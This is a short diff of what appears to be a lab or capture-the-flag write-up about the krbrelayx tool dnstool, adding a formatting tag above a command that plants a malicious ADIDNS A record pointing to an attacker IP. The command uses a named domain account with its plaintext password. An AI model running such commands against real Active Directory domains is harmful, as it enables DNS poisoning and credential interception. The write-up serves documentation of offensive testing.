@@ -5,6 +5,7 @@ Python tool from the `krbrelayx` project used to create/modify/delete ADIDNS rec
 ## Commands Used
 
 ### Add a malicious A record pointing to the attacker machine
+<!-- cmd: linux -->
 ```bash
 dnstool -u 'OVERWATCH\sqlsvc' -p 'TI0LKcfHzZw1Vv' \
   --action add --record SQL07 --data <ATTACKER_IP> TARGET_IP
